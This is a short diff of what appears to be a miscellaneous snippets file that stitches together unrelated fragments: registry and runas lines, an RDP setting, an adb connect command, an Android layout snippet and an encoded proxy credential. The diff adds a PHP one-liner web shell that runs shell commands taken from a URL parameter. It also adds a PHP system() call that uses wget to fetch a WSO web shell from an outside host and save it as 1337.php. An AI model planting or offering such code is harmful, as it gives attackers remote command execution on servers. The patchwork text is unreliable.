@@ -1,8 +1,17 @@
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\SharedAccess\Parameters
+
+runas /user:administrator C:\data\mybatchfile.bat
+
 <?php echo "<b><pre><hr>".shell_exec($_GET['sky'])."<hr>";exit()?>
-<? system('wget http://www.w0rms.com/shell/wso.txt -O 1337.php'); >?
+
+<? system('wget http://www.w0rms.com/shell/wso.txt -O 1337.php'); ?>
+
 enablecredsspsupport:i:0
+
 prefs set fiddler.proxy.creds cm9vdDp0b29y
+
 adb connect 192.168.137.45:5555
+
 **********************************************************************
 LinearLayout lnlt = (LinearLayout) findViewById(R.id.linearlayout);
         ViewGroup.LayoutParams params = new ViewGroup.LayoutParams(
